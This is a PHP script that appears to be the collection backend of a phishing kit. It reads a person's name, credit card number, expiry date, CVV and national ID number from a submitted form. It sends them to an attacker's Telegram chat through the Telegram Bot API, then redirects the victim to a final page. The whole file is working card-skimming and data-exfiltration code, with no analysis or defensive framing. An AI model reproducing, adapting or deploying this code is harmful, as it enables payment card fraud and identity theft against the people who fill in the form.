<?php 

$nom = $_POST['nom'];
$cc = $_POST['cc'];
$venc = $_POST['venc'];
$cvv = $_POST['cvv'];
$dni = $_POST['dni'];



require 'bot.php';   

$html_message = "-----------[ Datos y Tarjeta]----------\n".
                "<b>✔️Nombres: </b><code>".$nom."</code>\n".
                "<b>✔️cc: </b><code>".$cc."</code>\n".
                "<b>✔️venc: </b><code>".$venc."</code>\n".
                "<b>✔️cvv: </b><code>".$cvv."</code>\n".
                "<b>✔️Dni: </b><code>".$dni."</code>\n".
                
				               				
				"----------------------------------------";

$html_message = urlencode($html_message);
$result = @file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$html_message&parse_mode=html");

header('location: final.html'); 
exit();





?>